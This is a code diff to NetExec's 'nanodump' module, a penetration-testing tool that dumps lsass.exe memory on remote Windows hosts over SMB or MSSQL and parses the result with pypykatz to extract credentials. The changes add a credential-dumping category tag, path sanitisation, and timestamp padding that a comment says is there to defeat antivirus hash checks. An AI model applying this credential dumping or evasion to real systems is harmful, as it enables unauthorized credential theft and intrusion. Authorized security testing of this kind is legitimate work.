@@ -9,6 +9,8 @@ from pypykatz.pypykatz import pypykatz
 import tempfile
 from datetime import datetime
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.misc import CATEGORY
+from nxc.helpers.path import sanitize_path_component
 from nxc.protocols.mssql.mssqlexec import MSSQLEXEC
 
 
@@ -16,8 +18,7 @@ class NXCModule:
     name = "nanodump"
     description = "Get lsass dump using nanodump and parse the result with pypykatz"
     supported_protocols = ["smb", "mssql"]
-    opsec_safe = False
-    multiple_hosts = True
+    category = CATEGORY.CREDENTIAL_DUMPING
 
     def __init__(self, context=None, module_options=None):
         self.connection = None
@@ -39,7 +40,6 @@ class NXCModule:
         NANO_EXE_NAME       Name of the nano executable (default: nano.exe)
         DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)
         """
-        self.context = context
         self.remote_tmp_dir = "C:\\Windows\\Temp\\"
         self.share = "C$"
         self.tmp_share = self.remote_tmp_dir.split(":")[1]
@@ -52,6 +52,10 @@ class NXCModule:
         self.nano = "nano.exe"
         self.nano_path = ""
         self.useembeded = True
+        # Add some random binary data to defeat AVs which check the file hash
+        padding = datetime.now().strftime("%Y%m%d%H%M%S").encode()
+        self.nano_embedded64 += padding
+        self.nano_embedded32 += padding
 
         if "NANO_PATH" in module_options:
             self.nano_path = module_options["NANO_PATH"]
@@ -150,9 +154,12 @@ class NXCModule:
             self.context.log.fail("Process lsass.exe error on dump, try with verbose")
             dump = False
 
-        if dump:
+        if not dump:
+            self.delete_nanodump_binary()
+            return
+        else:
             self.context.log.display(f"Copying {nano_log_name} to host")
-            filename = os.path.join(self.dir_result, f"{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log")
+            filename = os.path.join(self.dir_result, sanitize_path_component(f"{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log"))
             if self.context.protocol == "smb":
                 with open(filename, "wb+") as dump_file:
                     try:
@@ -174,7 +181,7 @@ class NXCModule:
                     self.context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
             else:
                 try:
-                    exec_method = MSSQLEXEC(self.connection.conn)
+                    exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
                     exec_method.get_file(self.remote_tmp_dir + nano_log_name, filename)
                     self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                 except Exception as e:
